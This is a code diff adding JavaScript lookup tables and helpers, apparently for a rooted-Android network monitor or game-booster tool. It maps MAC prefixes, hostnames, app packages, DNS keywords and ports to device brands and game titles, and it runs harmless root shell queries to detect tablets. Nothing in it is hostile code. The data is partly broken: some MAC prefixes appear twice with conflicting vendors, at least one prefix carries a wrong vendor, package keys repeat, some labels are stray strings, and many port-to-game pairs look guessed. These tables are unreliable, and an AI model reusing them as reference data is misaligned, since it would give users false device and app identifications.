+        '00:12:FB':'Samsung','C0:97:3E':'Samsung','50:CC:F7':'Samsung','8C:8E:8E':'Samsung','5C:0A:5B':'Samsung','FC:8A:E5':'Samsung','AC:5F:3F':'Samsung','B0:5C:99':'Samsung','38:AA:3C':'Samsung','A8:F8:39':'Samsung','E0:2A:ED':'Samsung','B0:09:DA':'Samsung','D4:97:0B':'Samsung','88:32:1F':'Samsung','34:14:49':'Samsung','14:1F:BA':'Samsung',
+        // ZTE / nubia
+        '00:1F:E2':'ZTE','C8:64:68':'ZTE','24:05:0F':'ZTE','5C:EA:1D':'ZTE','08:D2:7B':'ZTE','F0:5C:77':'ZTE','58:7A:6B':'ZTE','00:11:92':'nubia','C4:0B:4D':'nubia','C0:EE:FB':'ZTE','D8:E0:E1':'ZTE','F4:EE:3A':'ZTE',
+        // Meizu
+        '04:92:5A':'Meizu','8C:BE:BE':'Meizu','B0:13:2D':'Meizu','E0:1C:88':'Meizu','E4:54:C3':'Meizu',
+        // Lenovo
+        '00:24:54':'Lenovo','14:5A:05':'Lenovo','C8:FF:28':'Lenovo','00:24:E4':'Lenovo PC','F0:76:1C':'Lenovo PC','C0:38:0E':'Lenovo','50:46:78':'Lenovo',
+        // Microsoft / Dell / HP
+        '00:0D:3A':'Microsoft','5C:7F:17':'Microsoft','00:14:A4':'Dell','00:14:22':'Dell','F8:DB:88':'Dell','D4:AE:52':'Dell','00:1A:A0':'HP','00:24:A8':'HP','3C:5A:B4':'HP','A0:48:1C':'HP','F4:5C:89':'HP',
+        // ASUS
+        '00:0C:29':'ASUS','00:11:2F':'ASUS','F8:DB:7F':'ASUS','AC:9B:0A':'ASUS','38:D5:47':'ASUS','E0:3F:49':'ASUS',
+        // Networking
+        '00:25:9C':'Cisco','00:1A:6C':'Cisco','FC:FB:FB':'Cisco','00:1D:0F':'TPLink','50:BD:5F':'TPLink','F4:EC:38':'TPLink','EC:08:6B':'TPLink','00:0C:43':'TP-Link','14:CC:82':'TP-Link','B0:48:1A':'TP-Link','00:E0:4C':'Realtek','00:13:46':'Realtek','00:1B:DE':'Netgear','00:1F:33':'Netgear','28:3B:71':'Netgear','00:11:95':'Netgear','C0:3F:0E':'Netgear','44:94:FC':'Netgear','9C:3D:CF':'Netgear','E0:46:9A':'Netgear','A0:21:B7':'Netgear',
+        // Raspberry Pi
+        'B8:27:EB':'RaspberryPi','DC:A6:32':'RaspberryPi','E4:5F:01':'RaspberryPi','28:CD:C1':'RaspberryPi',
+        // Google
+        'B0:F1:1C':'Google','F4:F5:E8':'Google','3C:28:6D':'Google','F4:6A:6D':'Google','94:18:65':'Google','30:95:65':'Google',
+        // Sony
+        'A4:34:D9':'Sony','B8:8D:12':'Sony','5C:9D:5E':'Sony','10:68:45':'Sony','7C:11:BE':'Sony',
+        // Nokia / Motorola / TCL / Letv
+        '00:19:86':'Nokia','48:43:B7':'Nokia','00:1C:D7':'Motorola','00:23:76':'Motorola','E0:73:E7':'Motorola','90:03:B7':'TCL','5C:52:2E':'TCL','B4:0B:44':'Letv','7C:B2:32':'Letv','90:B1:0D':'Letv',
+        // Smart TV / Streaming
+        '04:E6:57':'SmartTV','C0:8A:DE':'SmartTV','70:7E:2D':'SmartTV','A0:C9:E4':'SmartTV','5C:49:8C':'SmartTV','80:3F:54':'SmartTV','74:03:BD':'SmartTV','CC:6E:73':'SmartTV','D4:05:DB':'SmartTV','E8:40:41':'SmartTV','F0:79:38':'SmartTV','48:BF:6B':'SmartTV',
+        // Various IoT / Smart Home
+        '18:05:32':'IoT','68:9E:19':'IoT','A0:02:42':'IoT','74:DA:38':'IoT','D0:03:04':'IoT','7C:DD:A1':'IoT','EC:11:21':'IoT',
+        // PC manufacturers
+        '00:1D:72':'Acer','00:1D:7B':'Acer','30:5A:3A':'Acer','D4:9E:FC':'Acer','00:1B:38':'MSI','00:11:0A':'MSI','C0:4A:00':'MSI',
+        // Tablets
+        '00:1A:9B':'Teclast','20:82:E0':'Teclast','C0:3E:0A':'Teclast','10:02:B4':'Cube','C0:97:3E':'Cube',
+        // VR / AR
+        'C0:EE:FB':'Meta','D4:1E:28':'Meta','54:35:4D':'Meta',
+        // Nintendo / Gaming
+        '00:0C:6E':'Nintendo','00:17:AB':'Nintendo','00:1D:83':'Nintendo','00:1F:C5':'Nintendo','00:23:31':'Nintendo','00:23:CC':'Nintendo','00:26:32':'Nintendo','00:2B:32':'Nintendo',
+    }
+    Object.freeze(MAC_OUI_DB) // 【内存优化】冻结只读常量，防止意外修改
+    const BRAND_INFO = {
+        'Apple':{bg:'linear-gradient(135deg,#555,#999)',text:'',label:'Apple'},
+        'Huawei':{bg:'linear-gradient(135deg,#C8102E,#E63946)',text:'HW',label:'华为'},
+        'Xiaomi':{bg:'linear-gradient(135deg,#FF6900,#FF8C42)',text:'MI',label:'小米'},
+        'Redmi':{bg:'linear-gradient(135deg,#FF4D4D,#FF6B35)',text:'红',label:'红米'},
+        'OPPO':{bg:'linear-gradient(135deg,#00A651,#0EAE57)',text:'OP',label:'OPPO'},
+        'vivo':{bg:'linear-gradient(135deg,#415FFF,#6B8CFF)',text:'vivo',label:'vivo'},
+        'iQOO':{bg:'linear-gradient(135deg,#000,#333)',text:'iQ',label:'iQOO'},
+        'Samsung':{bg:'linear-gradient(135deg,#1428A0,#243BD8)',text:'SS',label:'三星'},
+        'OnePlus':{bg:'linear-gradient(135deg,#EB0028,#FF4D5A)',text:'1+',label:'一加'},
+        'Honor':{bg:'linear-gradient(135deg,#1A237E,#3949AB)',text:'荣耀',label:'荣耀'},
+        'ZTE':{bg:'linear-gradient(135deg,#005BAC,#0080D0)',text:'ZTE',label:'中兴'},
+        'realme':{bg:'linear-gradient(135deg,#FFC601,#FFD73C)',text:'R',label:'真我'},
+        'Meizu':{bg:'linear-gradient(135deg,#00A6E0,#00C2FF)',text:'MZ',label:'魅族'},
+        'Lenovo':{bg:'linear-gradient(135deg,#E2231A,#E8484B)',text:'LE',label:'联想'},
+        'nubia':{bg:'linear-gradient(135deg,#C8102E,#E63946)',text:'NZ',label:'努比亚'},
+        'Microsoft':{bg:'linear-gradient(135deg,#0078D4,#00A4EF)',text:'MS',label:'微软'},
+        'Dell':{bg:'linear-gradient(135deg,#007DB8,#00A4D8)',text:'DE',label:'戴尔'},
+        'HP':{bg:'linear-gradient(135deg,#0096D6,#00B4E0)',text:'HP',label:'惠普'},
+        'ASUS':{bg:'linear-gradient(135deg,#003087,#0055B3)',text:'AS',label:'华硕'},
+        'Lenovo PC':{bg:'linear-gradient(135deg,#E2231A,#E8484B)',text:'LE',label:'联想'},
+        'Cisco':{bg:'linear-gradient(135deg,#1BA0E2,#0A7CAB)',text:'CI',label:'思科'},
+        'TPLink':{bg:'linear-gradient(135deg,#0A7CBA,#1B9FE0)',text:'TP',label:'TP-Link'},
+        'TP-Link':{bg:'linear-gradient(135deg,#0A7CBA,#1B9FE0)',text:'TP',label:'TP-Link'},
+        'Realtek':{bg:'linear-gradient(135deg,#00B388,#00C994)',text:'RT',label:'瑞昱'},
+        'Netgear':{bg:'linear-gradient(135deg,#4B3A8A,#6B52B5)',text:'NG',label:'网件'},
+        'RaspberryPi':{bg:'linear-gradient(135deg,#C51A4A,#E83E68)',text:'RPi',label:'树莓派'},
+        'Google':{bg:'linear-gradient(135deg,#4285F4,#5A9BF5)',text:'GG',label:'Google'},
+        'Sony':{bg:'linear-gradient(135deg,#333,#555)',text:'SO',label:'索尼'},
+        'Nokia':{bg:'linear-gradient(135deg,#124191,#1B5FCC)',text:'NK',label:'诺基亚'},
+        'Motorola':{bg:'linear-gradient(135deg,#0A5CB8,#1273E0)',text:'MT',label:'摩托罗拉'},
+        'TCL':{bg:'linear-gradient(135deg,#0082C8,#009FE3)',text:'TCL',label:'TCL'},
+        'Letv':{bg:'linear-gradient(135deg,#D33A2C,#E8584C)',text:'LE',label:'乐视'},
+        'SmartTV':{bg:'linear-gradient(135deg,#1a237e,#283593)',text:'TV',label:'智能电视'},
+        'IoT':{bg:'linear-gradient(135deg,#455a64,#607d8b)',text:'IoT',label:'智能设备'},
+        'Acer':{bg:'linear-gradient(135deg,#83b81a,#a4d637)',text:'AC',label:'宏碁'},
+        'MSI':{bg:'linear-gradient(135deg,#c8102e,#e63946)',text:'MSI',label:'微星'},
+        'Teclast':{bg:'linear-gradient(135deg,#ff6d00,#ff9100)',text:'TE',label:'台电'},
+        'Cube':{bg:'linear-gradient(135deg,#5c6bc0,#7986cb)',text:'CB',label:'酷比魔方'},
+        'Meta':{bg:'linear-gradient(135deg,#1d44b4,#3b5fd9)',text:'MT',label:'Meta'},
+        'Nintendo':{bg:'linear-gradient(135deg,#d62828,#e63946)',text:'ND',label:'任天堂'},
+    }
+    Object.freeze(BRAND_INFO) // 【内存优化】冻结只读常量
+    const HOSTNAME_MODEL_DB = {
+        // Apple
+        'iphone':'iPhone','ipad':'iPad','ipod':'iPod','macbook':'MacBook','imac':'iMac','macmini':'Mac mini','apple':'Apple设备',
+        // Samsung
+        'sm-g998':'三星 S21 Ultra','sm-g991':'三星 S21','sm-g996':'三星 S21+','sm-g990':'三星 S21 FE',
+        'sm-g970':'三星 S10','sm-g975':'三星 S10+','sm-g960':'三星 S9','sm-g965':'三星 S9+',
+        'sm-g930':'三星 S8','sm-g935':'三星 S8+','sm-g950':'三星 S8','sm-g955':'三星 S8+',
+        'sm-g9':'三星 S系列','sm-a':'三星 A系列','sm-m':'三星 M系列','sm-n':'三星 Note系列','sm-s':'三星 S系列',
+        'sm-t':'三星 Tab系列','sm-p':'三星 Tab系列',
+        // Xiaomi / Redmi
+        'redmi':'红米','redmi-note':'红米 Note','redmi-k':'红米 K系列','redmi-pad':'红米 Pad',
+        'mi-':'小米','miui':'小米','hmnote':'红米 Note','miphone':'小米手机','xiaomi':'小米',
+        'm2007':'红米 K30','m2012':'红米 K40','m2104':'红米 K40 Gaming','2201':'红米 Note 11','2202':'红米 Note 11 Pro',
+        '2301':'红米 Note 12','2302':'红米 Note 12 Pro','2312':'红米 K70','2311':'红米 K70 Pro',
+        '2401':'小米14','23127':'小米14 Pro',
+        // Huawei / Honor
+        'huawei':'华为','honor':'荣耀','nova':'华为 Nova','p30':'华为 P30','p40':'华为 P40','p50':'华为 P50','mate':'华为 Mate',
+        'p60':'华为 P60','p70':'华为 Pura 70','aln':'华为 Mate 60','bgo':'华为 Mate 50','cma':'华为 Nova 11',
+        'honor-v':'荣耀 V系列','honor-play':'荣耀 Play','honor-x':'荣耀 X系列','honor-magic':'荣耀 Magic',
+        // OPPO / OnePlus / realme
+        'oppo':'OPPO','oneplus':'一加','realme':'真我','oneplus8':'一加 8','oneplus9':'一加 9','oneplus10':'一加 10',
+        'oneplus11':'一加 11','oneplus12':'一加 12','op5953':'OPPO Find X6','op5951':'OPPO Find X5',
+        'cph':'OPPO 手机','phb':'OPPO 手机','pjp':'OPPO 手机',
+        // vivo / iQOO
+        'vivo':'vivo','iqoo':'iQOO','vivo-x':'vivo X系列','vivo-s':'vivo S系列','vivo-y':'vivo Y系列',
+        'v2204':'vivo X80','v2241':'vivo X90','v2304':'vivo X100','v2316':'iQOO 12','v2309':'iQOO 11',
+        'pd2':'vivo 手机','pd4':'vivo 手机',
+        // Google / Sony / Nokia / Motorola
+        'pixel':'Google Pixel','pixel-5':'Pixel 5','pixel-6':'Pixel 6','pixel-7':'Pixel 7','pixel-8':'Pixel 8',
+        'nokia':'诺基亚','motorola':'摩托罗拉','moto':'摩托罗拉','moto-edge':'摩托罗拉 Edge',
+        // PC / Laptop
+        'lenovo':'联想','thinkpad':'ThinkPad','ideapad':'IdeaPad','thinkbook':'ThinkBook','yoga':'Yoga',
+        'dell':'戴尔','latitude':'Latitude','inspiron':'Inspiron','xps':'XPS','hp':'惠普','pavilion':'Pavilion','omen':'OMEN','elitebook':'EliteBook',
+        'asus':'华硕','rog':'ROG','zenbook':'ZenBook','tuf':'TUF','acernitro':'Acer Nitro','aspire':'Aspire',
+        'msi':'MSI','raider':'Raider','stealth':'Stealth','vector':'Vector',
+        // IoT / Smart Home
+        'raspberrypi':'树莓派','raspberry':'树莓派','esp8266':'ESP8266','esp32':'ESP32','arduino':'Arduino',
+        'alexa':'Echo','echo':'Echo','google-home':'Google Home','home-assistant':'Home Assistant',
+        // TV / Streaming
+        'androidtv':'Android TV','smarttv':'智能电视','firetv':'Fire TV','appletv':'Apple TV','chromecast':'Chromecast',
+        'xiaomi-tv':'小米电视','redmi-tv':'红米电视','hisense':'海信','tcl-tv':'TCL电视','skyworth':'创维',
+        // Gaming
+        'nintendo':'任天堂','switch':'Nintendo Switch','steamdeck':'Steam Deck',
+        'metaquest':'Meta Quest','oculus':'Oculus Quest',
+    }
+    Object.freeze(HOSTNAME_MODEL_DB) // 【内存优化】冻结只读常量
+    const GAME_PKG_DB = {
+        // 腾讯系
+        'com.tencent.tmgp.pubgmhd':'和平精英','com.tencent.tmgp.sgame':'王者荣耀',
+        'com.tencent.tmgp.cf':'穿越火线','com.tencent.tmgp.speedmobile':'QQ飞车',
+        'com.tencent.tmgp.dnf':'DNF手游','com.tencent.tmgp.lolm':'英雄联盟手游',
+        'com.tencent.tmgp.mbsj':'使命召唤手游','com.tencent.tmgp.nns':'火影忍者',
+        'com.tencent.tmgp.hyr':'火影忍者','com.tencent.tmgp.viv':'天天酷跑',
+        'com.tencent.tmgp.honor':'QQ华夏','com.tencent.tmgp.mg':'全民枪王',
+        'com.tencent.tmgp.dj':'天天炫斗','com.tencent.mobileqq':'QQ(游戏大厅)',
+        'com.tencent.qggames':'QQ游戏大厅','com.tencent.androidqqgame':'QQ游戏',
+        'com.tencent.tmgp.bns':'剑灵','com.tencent.tmgp.mc':'我的世界(腾讯版)',
+        'com.tencent.tmgp.chess':'天天象棋','com.tencent.tmgp.mj':'欢乐麻将',
+        'com.tencent.tmgp.poker':'欢乐斗地主','com.tencent.tmgp.landlord':'欢乐斗地主',
+        'com.tencent.cloudgame':'腾讯START云游戏',
+        // 王牌战争（文明重启）
+        'com.yingxiong.hero.aligames':'王牌战争','com.yingxiong.hero':'王牌战争','com.yingxiong.hero4399':'王牌战争',
+        // 米哈游
+        'com.miHoYo.GenshinImpact':'原神','com.miHoYo.YuanShen':'原神B服',
+        'com.miHoYo.enterprise.NGHSoD':'崩坏：星穹铁道','com.miHoYo.Hokai3':'崩坏3',
+        'com.miHoYo.ZenlessZoneZero':'绝区零','com.miHoYo.HoYoPlay':'米哈游启动器',
+        'com.miHoYo.enterprise.QYHF':'未定事件簿','com.miHoYo.incave':'天空之傲',
+        'com.miHoYo.enterprise.NHOTHP':'崩坏3(测试)',
+        // 网易
+        'com.netease.onmyoji':'阴阳师','com.netease.mrzh':'率土之滨','com.netease.zjz':'决战平安京',
+        'com.netease.sky':'Sky光遇','com.netease.dwrg':'第五人格','com.netease.g27':'荒野行动',
+        'com.netease.hyhd':' hypergryph','com.netease.mrzh.hd':'率土之滨HD',
+        'com.netease.ez':'大话西游','com.netease.x60':'梦幻西游','com.netease.df':'大航海之路',
+        'com.netease.cloudgame':'网易云游戏','com.netease.chinasword':'逆水寒',
+        'com.netease.mrzh.hd':'率土之滨HD','com.netease.lxhy':'流星蝴蝶剑',
+        'com.netease.win':'战意','com.netease.dao':'永劫无间手游',
+        // Supercell
+        'com.supercell.clashroyale':'皇室战争','com.supercell.clashofclans':'部落冲突',
+        'com.supercell.clashofclans.cn':'部落冲突(中国版)','com.supercell.brawlstars':'荒野乱斗',
+        'com.supercell.squadbusters':' squadronbusters','com.supercell.hayday':'卡通农场',
+        'com.supercell.boombeach':'海岛奇兵',
+        // 其他热门游戏
+        'com.mojang.minecraftpe':'我的世界','com.lilithgame.roc.gp':'万国觉醒',
+        'com.lilithgame.xgame.ios':'剑与远征','com.lilithgame.roc.gp.cn':'万国觉醒(国服)',
+        'com.lilithgame.afk.gp':'剑与远征','com.lilithgame.hw.gp':'剑与家园',
+        'com.ea.game.pvz2_free':'植物大战僵尸2','com.ea.game.fifa15_row':'FIFA足球',
+        'com.ea.game.nfsmw_row':'极品飞车','com.ea.game.simsmobile_row':'模拟人生',
+        'com.gameloft.android.ANMP.GloftA8HM':'狂野飙车8','com.gameloft.android.ANMP.GloftA9HM':'狂野飙车9',
+        'com.gameloft.android.ANMP.GloftM5HM':'现代战争5','com.gameloft.android.ANMP.GloftHM5HM':'现代战争',
+        'com.kiloo.subwaysurf':'地铁跑酷','com.king.candycrushsaga':'糖果传奇',
+        'com.king.candycrushsodasaga':'糖果苏打传奇','com.king.farmheroessaga':'农场英雄传奇',
+        // 二次元/卡牌类
+        'com.hypergryph.zjsn':'明日方舟','com.hypergryph.arknights':'明日方舟',
+        'com.bilibili.fatego':'FGO','com.bilibili.priconne':'公主连结',
+        'com.bilibili.dl.fgo':'FGO(渠道)','com.bilibili.mrzh':'率土之滨(B服)',
+        'com.hermes.bili':'哔哩哔哩',
+        'com.kuro.marvelous':'战双帕弥什','com.kuro.wuthering':'鸣潮',
+        'com.pwrd.hotta':'幻塔','com.pwrd.ro':'幻塔',
+        'com.tencent.tmgp.gcx':'光遇(腾讯)','com.igg.android.lordsmobile':' lordsmobile',
+        'com.igg.android.im':'IGG游戏',
+        'com.camelgames.lordsmobile':'王国纪事',
+        'com.cil.thgame':'时空猎人','com.cib.animals':'动物餐厅',
+        'com.funplus.familyfarm.familyfarmseaside':'家庭农场',
+        'com.dts.freefireth':' FreeFire','com.dts.freefire':' FreeFire',
+        'com.garena.game.freefire':'Free Fire','com.garena.game.freefireth':'Free Fire(泰)',
+        'com.riotgames.league.wildrift':'英雄联盟手游(拳头)',
+        'com.riotgames.teamfighttactics':'云顶之弈手游',
+        'com.blizzard.diabloimmortal':'暗黑破坏神：不朽',
+        'com.blizzard.hearthstone':'炉石传说',
+        'com.blizzard.wtcg.hearthstone':'炉石传说',
+        'com.activision.callofduty.shooter':'使命召唤',
+        'com.dena.ten':'十罗',
+        'com.square_enix.android_googleplay':'Square Enix',
+        'com.levelinfinite.honkaiimpact3rd':'崩坏3(国际)',
+        'com.kwai.game':'快手游戏',
+        'com.ssandsaga.heroes':'英雄杀',
+        'com.hero.entertainment.gp':'英雄娱乐',
+        // 休闲/益智
+        'com.kiloo.subwaysurf':'地铁跑酷','com.outfit7.talkingtom':'汤姆猫',
+        'com.outfit7.mytalkingtomfree':'我的汤姆猫','com.outfit7.mytalkingtom2':'我的汤姆猫2',
+        'com.rovio.baba':'愤怒的小鸟','com.rovio.angrybirds':'愤怒的小鸟',
+        'com.disney.trolopus':'迪士尼游戏',
+        'com.king.farmheros':'农场英雄',
+        // 体育/竞速
+        'com.ea.game.fifa14_row':'FIFA14','com.ea.game.nfsshift':'极品飞车',
+        'com.ea.game.needforspeed':'极品飞车','com.ea.game.fifa':'FIFA',
+        'com.gameloft.android.ANMP.GloftA6HP':'狂野飙车6',
+        'com.gameloft.android.ANMP.GloftA7HM':'狂野飙车7',
+        // MOBA/策略
+        'com.riotgames.league.wildrift':'英雄联盟手游',
+        'com.lilithgame.xgame.ios':'剑与远征','com.lilithgame.hw':'剑与家园',
+        'com.funplus.familyfarm':'家庭农场',
+        'com.camelgames.lordsmobile':'王国纪事',
+        'com.igg.android.lordsmobile':' lordsmobile',
+        // 模拟器
+        'com.tencent.tmgp.emulator':'腾讯模拟器',
+        'com.netease.mumu.mumumulator':'MuMu模拟器',
+        'com.bignox.mumu':'MuMu模拟器',
+        'com.bilibili.bilibilimini':'哔哩哔哩小游戏',
+        // 社交平台内置游戏
+        'com.tencent.mm':'微信','com.tencent.mobileqq':'手机QQ',
+        'com.eg.android.AlipayGphone':'支付宝',
+        // 其他热门
+        'com.dts.supercell':'Supercell游戏',
+        'com.joycity.odin':'奥丁','com.netease.tom':'汤姆猫跑酷',
+        'com.hero3.utk':'英雄无敌','com.hero3.legends':'英雄无敌传奇',
+        'com.camelgames.dota':'刀塔传奇',
+        'com.funplus.discord.gp':'Discord',
+        'com.discord':'Discord',
+        'com.tencent.qqlive':'腾讯视频(游戏中心)',
+        'com.ss.android.ugc.aweme':'抖音',
+        'com.smile.gifmaker':'快手',
+        'com.kuaishou.nebula':'快手极速版',
+        'com.screw.scruner':'螺丝拧',
+    }
+    Object.freeze(GAME_PKG_DB) // 【内存优化】冻结只读常量
+    const GAME_DNS_DB = {
+        '部落冲突':['supercell','clashofclans','clash-of-clans'],
+        '皇室战争':['clashroyale','clash-royale','royale'],
+        '荒野乱斗':['brawlstars','brawl-stars','brawl'],
+        '和平精英':['pubgm','pubgmobile','igame','cdntencent','pubgmhd','tencentmobile'],
+        '王者荣耀':['sgame','tmgp-sgame','tencentmob','honoraryking','pvp.qq.com','kfc.qq.com'],
+        '原神':['mihoyo','genshin','yuanshen','hoyolab','hoyoverse','hoyowiki'],
+        '崩坏':['bh3','honkai','starrail','ngsod','honkai3rd','star-rail'],
+        '绝区零':['zenless','zzz','zenlesszonezero'],
+        '英雄联盟':['lolm','leagueoflegends','lol.qq','wildrift','riot'],
+        '穿越火线':['cf.qq','crossfire','cfmobile'],
+        '使命召唤':['callofduty','codmobile','codm','activision'],
+        'QQ飞车':['speedmobile','qqspeed','speed.qq'],
+        'DNF':['dnf.qq','dnfmobile','dungeon','neople'],
+        '火影忍者':['naruto','hyr.qq','nns.qq','bandai'],
+        '阴阳师':['onmyoji','yys.netease'],
+        '第五人格':['dwrg','identityv','idv.netease'],
+        '荒野行动':['knivesout','g27.netease','cyberhunter'],
+        '光遇':['sky.netease','thatgamecompany','skychildrenoflight'],
+        '我的世界':['minecraft','mojang','mcpe'],
+        '万国觉醒':['rok.lilith','riseofkingdoms','lilithgame'],
+        '狂野飙车':['gameloft','asphalt','gloft'],
+        '糖果传奇':['candycrushsaga','candycrush','king.com'],
+        '地铁跑酷':['subwaysurf','subway-surfers','kiloo'],
+        '哈利波特':['hpmagic','hp.netease','harrypotter'],
+        '云游戏':['cloudgame','start.qq','cloudgame.netease'],
+        '明日方舟':['arknights','hypergryph','skland'],
+        'FGO':['fate-go','fategrandorder','fgo','aniplex'],
+        '公主连结':['priconne','princessconnect','cr.pcr'],
+        '战双帕弥什':['pgr','kurogame','punishing'],
+        '鸣潮':['wuthering','kurogame','wutheringwaves'],
+        '幻塔':['hotta','pwrd','toweroffantasy'],
+        'Free Fire':['freefire','garena','ff.garena'],
+        '暗黑破坏神':['diablo','blizzard','diabloimmortal'],
+        '炉石传说':['hearthstone','blizzard','battle.net'],
+        '永劫无间':['narakabladepoint','netease.naraka','narakagame'],
+        '逆水寒':['chinasword','netease.nssb','justice.netease'],
+        '金铲铲之战':['tft','teamfight','riotgames'],
+        '金铲铲':['tftmobile','cloudtft','riotgames'],
+        'Apex':['apex','ea.com','apexmobile'],
+        '球球大作战':['supercell.boom','ballbattle','ballfight'],
+        '球球英雄':['ballhero','heroball'],
+    }
+    Object.freeze(GAME_DNS_DB) // 【内存优化】冻结只读常量
+    const GAME_PORT_DB = {
+        // Supercell
+        '8430':'部落冲突','9339':'部落冲突','5222':'皇室战争','5223':'荒野乱斗',
+        '9331':'部落冲突','9332':'荒野乱斗','9330':'皇室战争',
+        // 腾讯
+        '23456':'和平精英','8053':'王者荣耀','17000':'王者荣耀',
+        '18080':'穿越火线','10012':'QQ飞车','10013':'DNF手游',
+        '10030':'QQ飞车','10031':'穿越火线','10032':'王者荣耀',
+        // 米哈游
+        '22102':'原神','22103':'原神','22101':'崩坏：星穹铁道',
+        '22104':'绝区零','21004':'崩坏3',
+        // 网易
+        '5050':'阴阳师','5051':'第五人格','5052':'荒野行动',
+        '5053':'率土之滨','5054':'决战平安京','5055':'大话西游',
+        // 拳头
+        '5229':'英雄联盟手游','5230':'云顶之弈',
+        // 暴雪
+        '1119':'炉石传说','3724':'暗黑破坏神',
+        // EA
+        '43300':'Apex','43301':'FIFA','43310':'极品飞车',
+        // Minecraft
+        '10001':'我的世界','25565':'我的世界(MP)','19132':'我的世界(PE)',
+        // Lilith
+        '9001':'万国觉醒','9002':'剑与远征',
+        // 通用游戏端口
+        '27015':'Steam游戏','27016':'Steam游戏','3478':'语音/游戏',
+        '6112':'暴雪游戏','6113':'暴雪游戏','6881':'暴雪游戏',
+        '3498':'游戏服务','3535':'游戏服务','3658':'游戏服务',
+    }
+    Object.freeze(GAME_PORT_DB) // 【内存优化】冻结只读常量
+
+    const getBrandByMac = (mac) => {
+        if (!mac) return '网络设备'
+        const prefix = mac.toUpperCase().substring(0, 8)
+        if (MAC_OUI_DB[prefix]) return MAC_OUI_DB[prefix]
+        const prefix6 = mac.toUpperCase().replace(/:/g, '').substring(0, 6)
+        for (const [oui, brand] of Object.entries(MAC_OUI_DB)) {
+            if (oui.replace(/:/g, '') === prefix6) return brand
+        }
+        return '网络设备'
+    }
+    const getModelByHostname = (hostname) => {
+        if (!hostname) return ''
+        const lower = hostname.toLowerCase()
+        for (const [key, model] of Object.entries(HOSTNAME_MODEL_DB)) {
+            if (lower.includes(key)) return model
+        }
+        return ''
+    }
+    const isRandomMac = (mac) => {
+        if (!mac || typeof mac !== 'string') return false
+        const parts = mac.split(':')
+        if (parts.length !== 6) return false
+        return (parseInt(parts[0], 16) & 0x02) !== 0
+    }
+    const maskMac = (mac) => {
+        if (!mac) return ''
+        const parts = mac.split(':')
+        if (parts.length !== 6) return mac
+        return parts[0]+':'+parts[1]+':'+parts[2]+':**:**:**'
+    }
+    const formatBytes = (bytes) => {
+        const num = parseInt(bytes) || 0
+        const abs = Math.abs(num)
+        if (abs >= 1073741824) return (num/1073741824).toFixed(2)+'GB'
+        if (abs >= 1048576) return (num/1048576).toFixed(2)+'MB'
+        if (abs >= 1024) return (num/1024).toFixed(1)+'KB'
+        return num+'B'
+    }
+    const guessGameByDns = (dnsText) => {
+        if (!dnsText) return ''
+        var lower = dnsText.toLowerCase()
+        var bestMatch = '', bestScore = 0
+        for (var gameName in GAME_DNS_DB) {
+            var domains = GAME_DNS_DB[gameName]
+            for (var i = 0; i < domains.length; i++) {
+                if (lower.includes(domains[i].toLowerCase())) {
+                    if (domains[i].length > bestScore) { bestScore = domains[i].length; bestMatch = gameName }
+                }
+            }
+        }
+        return bestMatch
+    }
+    const guessGameByPort = (ports) => {
+        if (!ports || ports.length === 0) return ''
+        for (var i = 0; i < ports.length; i++) {
+            var p = ports[i].replace(/.*:/, '')
+            if (GAME_PORT_DB[p]) return GAME_PORT_DB[p]
+        }
+        return ''
+    }
+    const guessGameByPkg = (pkg) => {
+        if (!pkg) return ''
+        // 1) 精确匹配（最快最准）
+        if (GAME_PKG_DB[pkg]) return GAME_PKG_DB[pkg]
+        var lower = pkg.toLowerCase()
+        // 2) 前缀匹配（渠道包/多架构包名，如 com.tencent.tmgp.sgame.huawei）
+        for (var key in GAME_PKG_DB) {
+            var lk = key.toLowerCase()
+            if (lower.startsWith(lk + '.') || lk.startsWith(lower + '.')) return GAME_PKG_DB[key]
+        }
+        // 3) 腾讯通道聚合：com.tencent.tmgp.* 都是腾讯发行的游戏
+        if (lower.startsWith('com.tencent.tmgp.')) return '腾讯游戏'
+        if (lower.startsWith('com.supercell.')) return 'Supercell游戏'
+        if (lower.indexOf('clash') >= 0) return '部落冲突/皇室战争'
+        if (lower.indexOf('moba') >= 0 || lower.indexOf('lol') >= 0) return 'MOBA类'
+        if (lower.indexOf('fps') >= 0 || lower.indexOf('shoot') >= 0) return '射击类'
+        if (lower.indexOf('rpg') >= 0 || lower.indexOf('mmo') >= 0) return '角色扮演'
+        // 认不出来的返回空 → 绝不瞎猜，杜绝误判
+        return ''
+    }
+
+    // ===== 游戏识别防误判体系 =====
+    // 设备类型缓存（手机/平板）：平板的活动栈常驻后台Activity容易误判，只认窗口焦点
+    let _deviceTypeCache = null
+    const isTabletDevice = async () => {
+        if (_deviceTypeCache !== null) return _deviceTypeCache
+        try {
+            var res = await runShellWithRoot('getprop ro.build.characteristics 2>/dev/null; echo ---; wm size 2>/dev/null | tail -1')
+            var text = (res && res.content) || ''
+            if (text.indexOf('tablet') >= 0 || text.indexOf('Tablet') >= 0) { _deviceTypeCache = true; return true }
+            var m = text.match(/(\d+)x(\d+)/)
+            if (m && (parseInt(m[1]) >= 1280 || parseInt(m[2]) >= 1280)) { _deviceTypeCache = true; return true }
+        } catch(e) {}
+        _deviceTypeCache = false
+        return false
+    }
+    // 桌面/系统UI包名关键词（识别到这些绝不当作游戏）
+    const _skipPkgKeys = ['launcher', 'systemui', 'com.android.', 'android.', 'com.google.android']
+    // 常见非游戏应用（社交/视频/购物/工具），前台是它们时不算游戏
+    const _notGamePkgs = {
+        'com.tencent.mm':'微信', 'com.tencent.mobileqq':'手机QQ', 'com.tencent.qzone':'QQ空间',
+        'com.eg.android.AlipayGphone':'支付宝', 'com.ss.android.ugc.aweme':'抖音',
+        'com.smile.gifmaker':'快手', 'com.kuaishou.nebula':'快手极速版',
+        'com.tencent.qqlive':'腾讯视频', 'com.hermes.bili':'哔哩哔哩', 'tv.danmaku.bili':'哔哩哔哩',
+        'com.ss.android.article.news':'今日头条', 'com.xunmeng.pinduoduo':'拼多多',
+        'com.tencent.android.qqdownloader':'应用宝', 'com.android.browser':'浏览器',
+        'com.android.chrome':'Chrome', 'com.mi.globalbrowser':'浏览器'
+    }
+    const isRealGame = (pkg) => {
+        if (!pkg) return false
+        if (_notGamePkgs[pkg]) return false
+        var lower = pkg.toLowerCase()
+        for (var i = 0; i < _skipPkgKeys.length; i++) {
+            if (lower.indexOf(_skipPkgKeys[i]) >= 0) return false
+        }
+        return true
+    }
+
+    let GAME_BOOST_ACTIVE = false
+    let GAME_BOOST_START_TIME = 0
+    let GAME_BOOST_CURRENT = ''
+    let GAME_BOOST_PKG = ''
+    let GAME_BOOST_DETECTED_BY = ''
+    const DETECT_SOURCE_MAP = {
